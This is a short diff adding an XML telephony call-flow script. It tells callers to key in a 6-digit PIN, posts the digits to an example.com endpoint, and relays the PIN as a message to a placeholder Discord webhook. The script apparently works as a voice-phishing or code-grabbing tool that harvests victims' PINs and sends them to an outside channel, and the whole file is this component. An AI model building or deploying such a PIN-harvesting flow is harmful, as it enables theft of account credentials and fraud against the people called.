@@ -1,0 +1,9 @@
+<Response>
+  <GetDigits action="http://example.com/postpincode.php?param={{myvariable}}" method="POST" numDigits="6">
+    <Speak>Please enter your 6-digit PIN code, followed by the pound sign.</Speak>
+  </GetDigits>
+  <Speak>Thank you for entering your PIN code.</Speak>
+  <Message src="YOUR_PHONE_NUMBER" dst="YOUR_DISCORD_WEBHOOK_URL">
+    PIN code entered: {{myvariable}}
+  </Message>
+</Response>
